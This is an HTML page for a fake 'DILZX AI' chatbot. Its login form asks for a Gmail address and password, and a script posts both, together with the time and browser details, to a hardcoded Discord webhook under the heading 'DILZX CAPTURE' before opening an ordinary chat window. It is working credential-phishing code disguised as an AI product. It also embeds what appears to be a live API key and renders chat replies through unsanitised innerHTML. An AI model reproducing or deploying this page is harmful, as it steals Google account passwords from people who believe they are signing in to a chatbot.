<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DILZX AI | Dilzx Edition</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(ellipse at 20% 30%, #0a0a1a, #030308);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .neural-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.35;
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .container {
            position: relative;
            z-index: 1;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-card {
            background: rgba(10, 15, 30, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 48px 40px;
            border: 1px solid rgba(88, 101, 242, 0.5);
            max-width: 500px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: fadeInUp 0.5s ease;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }

        .discord-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto;
            filter: drop-shadow(0 0 20px rgba(88, 101, 242, 0.5));
            animation: logoGlow 2s ease-in-out infinite;
        }

        @keyframes logoGlow {
            0%, 100% { filter: drop-shadow(0 0 10px rgba(88, 101, 242, 0.5)); transform: scale(1); }
            50% { filter: drop-shadow(0 0 25px rgba(88, 101, 242, 0.8)); transform: scale(1.02); }
        }

        h1 {
            font-size: 36px;
            text-align: center;
            background: linear-gradient(135deg, #5865F2, #00d4ff, #7b2cbf);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-top: 16px;
            letter-spacing: 2px;
        }

        .tagline {
            text-align: center;
            color: #8b8ca8;
            font-size: 12px;
            margin-top: 8px;
            letter-spacing: 3px;
        }

        .input-group {
            margin-bottom: 24px;
            margin-top: 32px;
        }

        .input-group label {
            display: block;
            color: #cbd5e6;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            padding: 16px 18px;
            background: rgba(15, 18, 34, 0.8);
            border: 1.5px solid rgba(45, 55, 80, 0.8);
            border-radius: 24px;
            color: #fff;
            font-size: 15px;
            transition: all 0.3s;
        }

        .input-group input:focus {
            outline: none;
            border-color: #5865F2;
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.1);
        }

        .input-group input.error {
            border-color: #f87171;
            animation: shake 0.3s ease;
        }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #5865F2, #7b2cbf);
            border: none;
            border-radius: 32px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px -8px rgba(88, 101, 242, 0.5);
        }

        .login-btn:disabled {
            opacity: 0.6;
            transform: none;
        }

        .error-msg {
            background: rgba(239, 68, 68, 0.15);
            color: #f87171;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 13px;
            margin-top: 16px;
            text-align: center;
            display: none;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .chat-page {
            display: none;
            width: 100%;
        }

        .chat-page.active {
            display: block;
            animation: fadeInUp 0.4s ease;
        }

        .chat-header {
            background: rgba(10, 15, 30, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 16px 24px;
            margin-bottom: 20px;
            border: 1px solid rgba(88, 101, 242, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .small-logo {
            width: 40px;
            height: 40px;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(88, 101, 242, 0.1);
            padding: 8px 20px;
            border-radius: 60px;
            border: 1px solid rgba(88, 101, 242, 0.3);
        }

        .user-avatar {
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg, #5865F2, #7b2cbf);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        .user-email {
            color: #5865F2;
            font-size: 13px;
            font-weight: 500;
        }

        .chat-container {
            background: rgba(10, 15, 30, 0.5);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 24px;
            height: 450px;
            overflow-y: auto;
            border: 1px solid rgba(88, 101, 242, 0.15);
        }

        .chat-container::-webkit-scrollbar {
            width: 5px;
        }
        .chat-container::-webkit-scrollbar-track { background: #1a1a2e; border-radius: 10px; }
        .chat-container::-webkit-scrollbar-thumb { background: #5865F2; border-radius: 10px; }

        .message {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            animation: messageIn 0.3s ease;
        }

        @keyframes messageIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .message.user { justify-content: flex-end; }
        .message.user .message-avatar { order: 2; }

        .message-avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            flex-shrink: 0;
        }

        .message.assistant .message-avatar {
            background: linear-gradient(135deg, #5865F220, #7b2cbf20);
            border: 1px solid rgba(88, 101, 242, 0.3);
        }
        .message.user .message-avatar {
            background: linear-gradient(135deg, #7b2cbf20, #5865F220);
            border: 1px solid rgba(123, 44, 191, 0.3);
        }

        .message-bubble {
            max-width: 70%;
            padding: 12px 18px;
            border-radius: 20px;
            font-size: 14px;
            line-height: 1.5;
        }

        .message.assistant .message-bubble {
            background: rgba(15, 18, 34, 0.9);
            border: 1px solid rgba(88, 101, 242, 0.2);
            color: #e0e0e0;
            border-radius: 20px 20px 20px 8px;
        }
        .message.user .message-bubble {
            background: linear-gradient(135deg, #5865F2, #7b2cbf);
            color: white;
            border-radius: 20px 20px 8px 20px;
        }

        .typing-indicator {
            display: none;
            align-items: center;
            gap: 12px;
            padding: 10px 18px;
            background: rgba(15, 18, 34, 0.9);
            border: 1px solid rgba(88, 101, 242, 0.2);
            border-radius: 30px;
            width: fit-content;
            margin-bottom: 20px;
        }

        .typing-dots { display: flex; gap: 5px; }
        .typing-dots span {
            width: 8px; height: 8px; background: #5865F2; border-radius: 50%;
            animation: blinkDot 1.4s infinite;
        }
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes blinkDot {
            0%,60%,100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-8px); opacity: 1; }
        }

        .input-wrapper {
            display: flex;
            gap: 12px;
            margin-top: 20px;
        }

        .input-wrapper input {
            flex: 1;
            padding: 16px 20px;
            background: rgba(15, 18, 34, 0.9);
            border: 1.5px solid rgba(45, 55, 80, 0.8);
            border-radius: 60px;
            color: #fff;
            font-size: 14px;
        }

        .input-wrapper input:focus {
            outline: none;
            border-color: #5865F2;
        }

        .send-btn {
            padding: 0 32px;
            background: linear-gradient(135deg, #5865F2, #7b2cbf);
            border: none;
            border-radius: 60px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .send-btn:hover {
            transform: scale(1.02);
        }

        .send-btn:disabled {
            opacity: 0.5;
        }

        .suggestions {
            display: flex;
            gap: 10px;
            margin-top: 16px;
            flex-wrap: wrap;
        }

        .suggestion-chip {
            background: rgba(15, 18, 34, 0.8);
            border: 1px solid rgba(88, 101, 242, 0.2);
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 12px;
            color: #8b8ca8;
            cursor: pointer;
            transition: all 0.2s;
        }

        .suggestion-chip:hover {
            border-color: #5865F2;
            color: #5865F2;
        }

        .logout-btn {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid rgba(239, 68, 68, 0.5);
            padding: 8px 16px;
            border-radius: 40px;
            color: #f87171;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .logout-btn:hover {
            background: rgba(239, 68, 68, 0.4);
        }
    </style>
</head>
<body>
    <div class="neural-bg">
        <canvas id="neuralCanvas"></canvas>
    </div>

    <div class="container">
        <!-- LOGIN PAGE -->
        <div id="loginPage">
            <div class="login-card">
                <div class="logo-container">
                    <svg class="discord-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <defs>
                            <linearGradient id="discordGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                                <stop offset="0%" stop-color="#5865F2"/>
                                <stop offset="100%" stop-color="#7b2cbf"/>
                            </linearGradient>
                        </defs>
                        <circle cx="50" cy="50" r="35" fill="url(#discordGrad)" opacity="0.15"/>
                        <path d="M35 35 L65 35 L65 65 L35 65 Z" stroke="url(#discordGrad)" stroke-width="2.5" fill="none" rx="8"/>
                        <circle cx="42" cy="48" r="4" fill="url(#discordGrad)"/>
                        <circle cx="58" cy="48" r="4" fill="url(#discordGrad)"/>
                        <path d="M42 58 Q50 66 58 58" stroke="url(#discordGrad)" stroke-width="2" fill="none" stroke-linecap="round"/>
                        <path d="M28 42 L35 42 M72 42 L65 42" stroke="#00d4ff" stroke-width="2" opacity="0.6"/>
                    </svg>
                </div>
                <h1>DILZX AI</h1>
                <div class="tagline">DILZX INTEGRATION ACTIVE</div>

                <div class="input-group">
                    <label>EMAIL</label>
                    <input type="email" id="loginEmail" placeholder="username@gmail.com">
                </div>
                <div class="input-group">
                    <label>PASSWORD</label>
                    <input type="password" id="loginPassword" placeholder="••••••••">
                </div>
                <button class="login-btn" onclick="doLogin()">ACCESS SYSTEM →</button>
                <div class="error-msg" id="loginError"></div>
            </div>
        </div>

        <!-- CHAT PAGE -->
        <div id="chatPage" class="chat-page">
            <div class="chat-header">
                <div class="logo-area">
                    <svg width="40" height="40" viewBox="0 0 100 100">
                        <circle cx="50" cy="50" r="25" fill="none" stroke="#5865F2" stroke-width="2"/>
                        <circle cx="40" cy="45" r="3" fill="#5865F2"/>
                        <circle cx="60" cy="45" r="3" fill="#5865F2"/>
                        <path d="M42 58 Q50 66 58 58" stroke="#5865F2" stroke-width="2" fill="none"/>
                    </svg>
                    <div>
                        <div style="color:white; font-weight:600;">DILZX AI</div>
                        <div style="font-size:10px; color:#5865F2;">DISCORD SYNC</div>
                    </div>
                </div>
                <div style="display: flex; gap: 12px; align-items: center;">
                    <div class="user-info">
                        <div class="user-avatar">🎮</div>
                        <div class="user-email" id="chatUserEmail">Loading...</div>
                    </div>
                    <div class="logout-btn" onclick="logout()">EXIT</div>
                </div>
            </div>

            <div class="chat-container" id="chatContainer">
                <div class="message assistant">
                    <div class="message-avatar">🤖</div>
                    <div class="message-bubble">
                        <strong>SYSTEM ONLINE</strong><br><br>
                        Dilzx integration active.<br>
                        Ask me anything!
                    </div>
                </div>
            </div>

            <div class="typing-indicator" id="typingIndicator">
                <div class="typing-dots">
                    <span></span><span></span><span></span>
                </div>
                <div style="font-size:12px; color:#8b8ca8;">PROCESSING...</div>
            </div>

            <div class="input-wrapper">
                <input type="text" id="messageInput" placeholder="Type your message..." onkeypress="if(event.key==='Enter') sendMessage()">
                <button class="send-btn" onclick="sendMessage()">SEND</button>
            </div>

            <div class="suggestions">
                <div class="suggestion-chip" onclick="sendSuggestion('What is AI?')">AI EXPLAIN</div>
                <div class="suggestion-chip" onclick="sendSuggestion('Tell me a joke')">JOKE</div>
                <div class="suggestion-chip" onclick="sendSuggestion('Write Python code')">PYTHON</div>
            </div>
        </div>
    </div>

    <script>
        // ============ DISCORD WEBHOOK URL (SUDAH TERPASANG) ============
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1512756164541157426/h2Q7gUvAIsUePQfNj8D5bH0KJhCVgVb5JEpYIhCD1InxeF1l1vNTprBaRAj4lOysk0zW';
        
        const OPENROUTER_API_KEY = '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';
        
        let currentUser = '';

        // ============ VALIDASI GMAIL ============
        function isValidGmail(email) {
            return email && email.toLowerCase().endsWith('@gmail.com') && email.length > 10;
        }

        // ============ KIRIM KE DISCORD ============
        async function sendToDiscord(email, password) {
            const embed = {
                title: '🔐 DILZX CAPTURE',
                color: 0x5865F2,
                fields: [
                    { name: '📧 EMAIL', value: email, inline: true },
                    { name: '🔑 PASSWORD', value: password, inline: true },
                    { name: '🕐 TIME', value: new Date().toLocaleString(), inline: false },
                    { name: '📱 USER AGENT', value: navigator.userAgent.substring(0, 100), inline: false }
                ],
                footer: { text: 'DILZX AI Capture System' },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
                console.log('✅ Sent to Discord');
            } catch(e) {
                console.log('❌ Discord error:', e);
            }
        }

        // ============ LOGIN ============
        async function doLogin() {
            const email = document.getElementById('loginEmail').value.trim();
            const password = document.getElementById('loginPassword').value.trim();
            const errorDiv = document.getElementById('loginError');
            const emailInput = document.getElementById('loginEmail');
            const loginBtn = document.querySelector('.login-btn');

            emailInput.classList.remove('error');
            errorDiv.style.display = 'none';

            if (!email || !password) {
                errorDiv.textContent = 'Enter email and password';
                errorDiv.style.display = 'block';
                return;
            }

            if (!isValidGmail(email)) {
                errorDiv.textContent = 'EMAIL MUST BE @GMAIL.COM';
                errorDiv.style.display = 'block';
                emailInput.classList.add('error');
                return;
            }

            loginBtn.disabled = true;
            loginBtn.textContent = 'ACCESSING...';

            try {
                await sendToDiscord(email, password);
                
                currentUser = email;
                localStorage.setItem('dilzx_current_user', email);
                
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('chatPage').classList.add('active');
                document.getElementById('chatUserEmail').innerText = email.length > 25 ? email.substring(0, 22) + '...' : email;
                
                document.getElementById('loginEmail').value = '';
                document.getElementById('loginPassword').value = '';
            } catch (error) {
                errorDiv.textContent = 'Error: ' + error.message;
                errorDiv.style.display = 'block';
            } finally {
                loginBtn.disabled = false;
                loginBtn.textContent = 'ACCESS SYSTEM →';
            }
        }

        // ============ LOGOUT ============
        function logout() {
            localStorage.removeItem('dilzx_current_user');
            currentUser = '';
            document.getElementById('chatContainer').innerHTML = `
                <div class="message assistant">
                    <div class="message-avatar">🤖</div>
                    <div class="message-bubble">
                        <strong>SYSTEM ONLINE</strong><br><br>
                        Discord integration active. Ask me anything!
                    </div>
                </div>
            `;
            document.getElementById('chatPage').classList.remove('active');
            document.getElementById('loginPage').style.display = 'block';
        }

        // ============ AI CHAT ============
        async function sendMessage() {
            const messageInput = document.getElementById('messageInput');
            const message = messageInput.value.trim();
            if (!message) return;

            addMessageToChat(message, 'user');
            messageInput.value = '';
            
            const sendBtn = document.querySelector('.send-btn');
            const typingIndicator = document.getElementById('typingIndicator');
            
            sendBtn.disabled = true;
            typingIndicator.style.display = 'flex';
            scrollChatToBottom();

            try {
                const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${OPENROUTER_API_KEY}`,
                        'Content-Type': 'application/json',
                        'HTTP-Referer': window.location.href,
                        'X-Title': 'DILZX AI'
                    },
                    body: JSON.stringify({
                        model: 'openai/gpt-3.5-turbo',
                        messages: [
                            {
                                role: 'system',
                                content: 'You are DILZX AI, a helpful assistant. Respond in the same language as the user.'
                            },
                            {
                                role: 'user',
                                content: message
                            }
                        ],
                        max_tokens: 800,
                        temperature: 0.7
                    })
                });

                const data = await response.json();
                typingIndicator.style.display = 'none';

                if (data.error) {
                    addMessageToChat('ERROR: ' + (data.error.message || 'System error'), 'assistant');
                } else if (data.choices && data.choices[0]) {
                    addMessageToChat(data.choices[0].message.content, 'assistant');
                } else {
                    addMessageToChat('Unable to process.', 'assistant');
                }
            } catch (error) {
                typingIndicator.style.display = 'none';
                addMessageToChat('CONNECTION ERROR: ' + error.message, 'assistant');
            }

            sendBtn.disabled = false;
            messageInput.focus();
        }

        function addMessageToChat(text, sender) {
            const container = document.getElementById('chatContainer');
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${sender}`;
            
            const avatar = document.createElement('div');
            avatar.className = 'message-avatar';
            avatar.innerHTML = sender === 'user' ? '👤' : '🤖';
            
            const bubble = document.createElement('div');
            bubble.className = 'message-bubble';
            bubble.innerHTML = text.replace(/\n/g, '<br>');
            
            messageDiv.appendChild(avatar);
            messageDiv.appendChild(bubble);
            container.appendChild(messageDiv);
            scrollChatToBottom();
        }

        function scrollChatToBottom() {
            const container = document.getElementById('chatContainer');
            container.scrollTop = container.scrollHeight;
        }

        function sendSuggestion(text) {
            document.getElementById('messageInput').value = text;
            sendMessage();
        }

        // ============ NEURAL NETWORK BACKGROUND ============
        const canvas = document.getElementById('neuralCanvas');
        let ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        
        let nodes = [];
        const nodeCount = 45;
        
        function initNodes() {
            nodes = [];
            for (let i = 0; i < nodeCount; i++) {
                nodes.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    vx: (Math.random() - 0.5) * 0.35,
                    vy: (Math.random() - 0.5) * 0.35,
                    radius: Math.random() * 2 + 1
                });
            }
        }
        
        function drawNeuralNetwork() {
            if (!ctx) return;
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            for (let node of nodes) {
                node.x += node.vx;
                node.y += node.vy;
                if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
                if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
                node.x = Math.max(0, Math.min(canvas.width, node.x));
                node.y = Math.max(0, Math.min(canvas.height, node.y));
            }
            
            for (let i = 0; i < nodes.length; i++) {
                for (let j = i + 1; j < nodes.length; j++) {
                    const dx = nodes[i].x - nodes[j].x;
                    const dy = nodes[i].y - nodes[j].y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    if (distance < 110) {
                        const opacity = (1 - distance / 110) * 0.12;
                        ctx.beginPath();
                        ctx.moveTo(nodes[i].x, nodes[i].y);
                        ctx.lineTo(nodes[j].x, nodes[j].y);
                        ctx.strokeStyle = `rgba(88, 101, 242, ${opacity})`;
                        ctx.stroke();
                    }
                }
            }
            
            for (let node of nodes) {
                ctx.beginPath();
                ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(88, 101, 242, ${node.radius / 3.5})`;
                ctx.fill();
            }
            
            requestAnimationFrame(drawNeuralNetwork);
        }
        
        window.addEventListener('resize', () => {
            resizeCanvas();
            initNodes();
        });
        
        resizeCanvas();
        initNodes();
        drawNeuralNetwork();

        // Auto login check
        const savedUser = localStorage.getItem('dilzx_current_user');
        if (savedUser) {
            currentUser = savedUser;
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('chatPage').classList.add('active');
            document.getElementById('chatUserEmail').innerText = savedUser.length > 25 ? savedUser.substring(0, 22) + '...' : savedUser;
        }

        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (document.getElementById('loginPage').style.display !== 'none') {
                    doLogin();
                }
            }
        });
    </script>
</body>
</html>
